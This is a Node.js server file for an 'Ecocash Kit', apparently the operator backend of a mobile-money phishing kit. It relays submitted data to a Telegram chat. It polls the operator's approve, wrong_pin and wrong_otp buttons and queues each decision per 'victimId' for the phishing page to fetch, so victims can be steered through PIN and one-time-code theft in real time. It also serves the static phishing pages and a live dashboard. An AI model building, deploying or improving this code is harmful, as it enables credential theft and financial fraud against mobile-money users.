'use strict';

const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json({ limit: '256kb' }));
app.use(express.text({ type: '*/*', limit: '16kb' }));

// ---------------------------------------------------------------
//  CONFIG
// ---------------------------------------------------------------
const BOT_TOKEN = process.env.BOT_TOKEN || '';
const CHAT_ID   = process.env.CHAT_ID   || '';
const TG_BASE   = 'https://api.telegram.org/bot' + BOT_TOKEN;

const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const STATE_FILE = path.join(DATA_DIR, 'pending.json');
const ACTION_TTL_MS = 30 * 60 * 1000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[WARN] BOT_TOKEN or CHAT_ID missing from env.');
}

// ---------------------------------------------------------------
//  Log ring + counters
// ---------------------------------------------------------------
const DEBUG_LOG = [];
const STATS = {
  bootedAt: Date.now(),
  lastUpdateAt: 0,
  lastUpdateCount: 0,
  lastDeliveredAt: 0,
  totalUpdates: 0,
  totalQueued: 0,
  totalDelivered: 0,
  totalErrors: 0
};

function slog(tag, msg) {
  const entry = { t: new Date().toISOString(), tag, msg: String(msg).slice(0, 300) };
  DEBUG_LOG.push(entry);
  if (DEBUG_LOG.length > 200) DEBUG_LOG.shift();
  if (tag === 'poller') STATS.lastUpdateAt = Date.now();
  if (tag === 'state' && msg.startsWith('delivered')) {
    STATS.lastDeliveredAt = Date.now();
    STATS.totalDelivered++;
  }
  if (tag.includes('err') || String(msg).includes('ERR') || String(msg).includes('EXCEPTION')) {
    STATS.totalErrors++;
  }
  console.log(`[${tag}]`, msg);
}

// ---------------------------------------------------------------
//  Pending action queue
// ---------------------------------------------------------------
let pendingActions = {};
let lastUpdateRaw = null;

function loadPending() {
  try {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    if (fs.existsSync(STATE_FILE)) {
      const raw = fs.readFileSync(STATE_FILE, 'utf8');
      pendingActions = JSON.parse(raw) || {};
      slog('state', 'loaded ' + Object.keys(pendingActions).length + ' pending');
    }
  } catch (e) {
    slog('state', 'load failed: ' + e.message);
    pendingActions = {};
  }
}

function savePending() {
  try {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify(pendingActions));
  } catch (e) {
    slog('state', 'save failed: ' + e.message);
  }
}

function purgeExpired() {
  const now = Date.now();
  let purged = 0;
  for (const id of Object.keys(pendingActions)) {
    if (now - pendingActions[id].ts > ACTION_TTL_MS) {
      delete pendingActions[id];
      purged++;
    }
  }
  if (purged) {
    savePending();
    slog('state', 'purged ' + purged + ' expired');
  }
}

loadPending();
setInterval(purgeExpired, 60 * 1000);

// ---------------------------------------------------------------
//  Telegram helpers
// ---------------------------------------------------------------
async function tgPost(method, payload, timeoutMs) {
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), timeoutMs || 12000);
  try {
    const res = await fetch(`${TG_BASE}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    return await res.json();
  } finally {
    clearTimeout(t);
  }
}

async function tgGet(method, query, timeoutMs) {
  const qs = query ? '?' + new URLSearchParams(query).toString() : '';
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), timeoutMs || 30000);
  try {
    const res = await fetch(`${TG_BASE}/${method}${qs}`, { signal: controller.signal });
    return await res.json();
  } finally {
    clearTimeout(t);
  }
}

// ---------------------------------------------------------------
//  Background poller
// ---------------------------------------------------------------
let POLL_OFFSET = null;
let POLLER_RUNNING = false;
let POLLER_ITERATION = 0;

async function pollerLoop() {
  if (POLLER_RUNNING) return;
  POLLER_RUNNING = true;
  slog('poller', 'STARTED');
  savePending();

  while (true) {
    POLLER_ITERATION++;
    try {
      if (!BOT_TOKEN) {
        slog('poller', 'no token, sleeping');
        await new Promise(r => setTimeout(r, 10000));
        continue;
      }

      const query = { timeout: 20, allowed_updates: JSON.stringify(['callback_query']) };
      if (POLL_OFFSET) query.offset = String(POLL_OFFSET);

      const j = await tgGet('getUpdates', query, 28000);

      if (!j || !j.ok) {
        STATS.totalErrors++;
        slog('poller', 'ERR iter=' + POLLER_ITERATION + ' ' + (j && (j.description || j.error_code) || 'unknown'));
        await new Promise(r => setTimeout(r, 3000));
        continue;
      }

      const updates = j.result || [];
      STATS.lastUpdateCount = updates.length;
      STATS.lastUpdateAt = Date.now();
      if (updates.length) STATS.totalUpdates += updates.length;

      if (updates.length) {
        slog('poller', 'iter=' + POLLER_ITERATION + ' got ' + updates.length + ' update(s)');
        lastUpdateRaw = JSON.stringify(updates, null, 2).slice(0, 2000);
      } else if (POLLER_ITERATION % 30 === 0) {
        slog('poller', 'iter=' + POLLER_ITERATION + ' idle');
      }

      for (const u of updates) {
        POLL_OFFSET = u.update_id + 1;
        const cb = u.callback_query;
        if (!cb) continue;

        const data = cb.data || '';
        const m = data.match(/^(approve|wrong_pin|wrong_otp)_(.+)$/);
        if (!m) {
          slog('poller', 'unparsed callback: ' + data);
          tgPost('answerCallbackQuery', { callback_query_id: cb.id }).catch(() => {});
          continue;
        }

        const action = m[1];
        const victimId = m[2];

        pendingActions[victimId] = { action, ts: Date.now() };
        STATS.totalQueued++;
        savePending();
        slog('poller', `QUEUED ${action} for ${victimId}`);

        tgPost('answerCallbackQuery', { callback_query_id: cb.id }, 4000)
          .then(r => slog('poller', `acked ${cb.id} ok=${r.ok}${r.ok ? '' : ' ' + (r.description || '')}`))
          .catch(e => slog('poller', `ack failed ${cb.id}: ${e.message}`));
      }
    } catch (e) {
      STATS.totalErrors++;
      slog('poller', 'EXCEPTION iter=' + POLLER_ITERATION + ' ' + (e && e.message));
      await new Promise(r => setTimeout(r, 3000));
    }

    await new Promise(r => setTimeout(r, 500));
  }
}

// ---------------------------------------------------------------
//  Routes
// ---------------------------------------------------------------
app.post('/tg/send', async (req, res) => {
  try {
    const { text, reply_markup } = req.body || {};
    if (!text || typeof text !== 'string') {
      return res.status(400).json({ ok: false, error: 'missing text' });
    }
    const payload = { chat_id: CHAT_ID, text, disable_web_page_preview: true };
    if (reply_markup) payload.reply_markup = reply_markup;
    const j = await tgPost('sendMessage', payload, 12000);
    slog('send', 'ok=' + j.ok + (j.ok ? '' : ' ' + j.description));
    res.json(j);
  } catch (e) {
    slog('send', 'ERR ' + (e && e.message));
    res.status(500).json({ ok: false, error: String(e && e.message || e) });
  }
});

app.get('/state', (req, res) => {
  const victimId = String(req.query.victimId || '');
  if (!victimId) return res.status(400).json({ ok: false, error: 'missing victimId' });

  const entry = pendingActions[victimId];
  if (!entry) {
    return res.json({ ok: true, action: null, poller: POLLER_RUNNING, iteration: POLLER_ITERATION });
  }

  delete pendingActions[victimId];
  savePending();
  slog('state', `delivered ${entry.action} to ${victimId}`);
  res.json({ ok: true, action: entry.action, ts: entry.ts });
});

app.get('/debug/log', (req, res) => {
  res.json({
    ok: true,
    stats: STATS,
    poller: { running: POLLER_RUNNING, iteration: POLLER_ITERATION, offset: POLL_OFFSET },
    pending: pendingActions,
    entries: DEBUG_LOG
  });
});

app.get('/healthz', (req, res) => {
  res.json({
    ok: true,
    bot: BOT_TOKEN ? 'set' : 'missing',
    chat: CHAT_ID ? 'set' : 'missing',
    poller: POLLER_RUNNING,
    pending: Object.keys(pendingActions).length,
    lastUpdateAgeMs: STATS.lastUpdateAt ? Date.now() - STATS.lastUpdateAt : -1,
    t: Date.now()
  });
});

// ---------------------------------------------------------------
//  Dashboard
// ---------------------------------------------------------------
app.get('/dashboard', (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`<!doctype html>
<html><head>
<meta charset="utf-8">
<title>Kit Dashboard</title>
<meta http-equiv="refresh" content="3">
<style>
  body { font: 13px/1.4 -apple-system, Consolas, monospace; background:#0b0b0f; color:#e5e5ea; margin:0; padding:16px; }
  h2 { font-size:15px; margin:20px 0 8px; color:#FFCC00; letter-spacing:0.5px; text-transform:uppercase; }
  .card { background:#14141a; border:1px solid #23232b; border-radius:10px; padding:12px; margin-bottom:12px; }
  .row { display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid #1f1f26; }
  .row:last-child { border-bottom:0; }
  .lbl { color:#8a8a95; }
  .ok { color:#22c55e; font-weight:bold; }
  .err { color:#ef4444; font-weight:bold; }
  .warn { color:#f59e0b; font-weight:bold; }
  pre { background:#0f0f14; padding:10px; border-radius:8px; overflow:auto; max-height:320px; font-size:11px; color:#cbd5e1; margin:0; }
  .log-line { padding:2px 0; border-bottom:1px solid #1a1a20; font-size:11px; }
  .log-line .t { color:#64748b; }
  .log-line .tag { color:#FFCC00; }
  .badge { display:inline-block; padding:2px 8px; border-radius:999px; font-size:11px; font-weight:700; }
  .badge.ok { background:#064e3b; color:#34d399; }
  .badge.err { background:#450a0a; color:#f87171; }
</style>
</head><body>
<h1 style="font-size:18px;margin:0 0 12px;color:#FFCC00;">Ecocash Kit — Dashboard</h1>
<div style="color:#64748b;font-size:11px;margin-bottom:16px;">Auto-refreshes every 3s. Keep open while testing.</div>
<div id="root">loading…</div>
<script>
async function load() {
  try {
    const r = await fetch('/debug/log', { cache: 'no-store' });
    const j = await r.json();
    render(j);
  } catch(e) {
    document.getElementById('root').innerHTML = '<div class="card err">Dashboard fetch failed: ' + e.message + '</div>';
  }
}
function fmtAge(ms) {
  if (ms < 0) return 'never';
  if (ms < 1000) return ms + 'ms';
  if (ms < 60000) return Math.round(ms/1000) + 's';
  return Math.round(ms/60000) + 'm';
}
function render(j) {
  const s = j.stats;
  const p = j.poller;
  const pendingKeys = Object.keys(j.pending || {});
  const html = []
  html.push('<h2>Poller</h2><div class="card">')
  html.push('<div class="row"><span class="lbl">Status</span><span class="' + (p.running ? 'ok' : 'err') + '">' + (p.running ? 'RUNNING' : 'STOPPED') + '</span></div>')
  html.push('<div class="row"><span class="lbl">Iteration</span><span>' + p.iteration + '</span></div>')
  html.push('<div class="row"><span class="lbl">Offset</span><span>' + (p.offset || 'none') + '</span></div>')
  html.push('<div class="row"><span class="lbl">Last update</span><span>' + fmtAge(Date.now() - s.lastUpdateAt) + ' ago</span></div>')
  html.push('<div class="row"><span class="lbl">Total updates</span><span>' + s.totalUpdates + '</span></div>')
  html.push('<div class="row"><span class="lbl">Total errors</span><span class="' + (s.totalErrors ? 'warn' : 'ok') + '">' + s.totalErrors + '</span></div>')
  html.push('</div>')

  html.push('<h2>Pending queue</h2><div class="card">')
  if (pendingKeys.length === 0) {
    html.push('<div class="row"><span class="lbl">Empty</span><span>—</span></div>')
  } else {
    for (const k of pendingKeys) {
      const e = j.pending[k];
      const age = Math.round((Date.now() - e.ts) / 1000);
      html.push('<div class="row"><span class="lbl">' + k + '</span><span class="warn">' + e.action + ' · ' + age + 's ago</span></div>')
    }
  }
  html.push('</div>')

  html.push('<h2>Counters</h2><div class="card">')
  html.push('<div class="row"><span class="lbl">Total queued</span><span>' + s.totalQueued + '</span></div>')
  html.push('<div class="row"><span class="lbl">Total delivered</span><span>' + s.totalDelivered + '</span></div>')
  html.push('<div class="row"><span class="lbl">Last delivered</span><span>' + (s.lastDeliveredAt ? fmtAge(Date.now() - s.lastDeliveredAt) + ' ago' : 'never') + '</span></div>')
  html.push('<div class="row"><span class="lbl">Boot time</span><span>' + fmtAge(Date.now() - s.bootedAt) + ' ago</span></div>')
  html.push('</div>')

  html.push('<h2>Log (last ' + j.entries.length + ')</h2><div class="card"><pre>')
  const last = j.entries.slice(-60).reverse();
  for (const e of last) {
    const t = e.t.slice(11, 19);
    let cls = '';
    if (e.msg.includes('ERR') || e.msg.includes('EXCEPTION')) cls = 'err';
    else if (e.msg.includes('QUEUED') || e.msg.includes('delivered')) cls = 'ok';
    html.push('<div class="log-line ' + cls + '"><span class="t">' + t + '</span> <span class="tag">[' + e.tag + ']</span> ' + escapeHtml(e.msg) + '</div>')
  }
  html.push('</pre></div>')

  document.getElementById('root').innerHTML = html.join('')
}
function escapeHtml(s) {
  return String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))
}
load()
setInterval(load, 3000)
</script>
</body></html>`);
});

// ---------------------------------------------------------------
//  Static
// ---------------------------------------------------------------
app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));

// ---------------------------------------------------------------
//  Boot
// ---------------------------------------------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  slog('boot', `up on :${PORT}`);
  slog('boot', `bot=${BOT_TOKEN ? 'set' : 'MISSING'} chat=${CHAT_ID ? 'set' : 'MISSING'}`);
  slog('boot', 'DATA_DIR=' + DATA_DIR);

  if (BOT_TOKEN) {
    try {
      const j = await tgPost('deleteWebhook', { drop_pending_updates: false }, 6000);
      slog('boot', 'deleteWebhook: ' + JSON.stringify(j));
    } catch (e) {
      slog('boot', 'deleteWebhook failed: ' + e.message);
    }
    pollerLoop();
  } else {
    slog('boot', 'no BOT_TOKEN — poller not started');
  }
});

if (process.env.RENDER_EXTERNAL_URL) {
  setInterval(() => {
    fetch(process.env.RENDER_EXTERNAL_URL + '/healthz').catch(() => {});
  }, 4 * 60 * 1000);
}
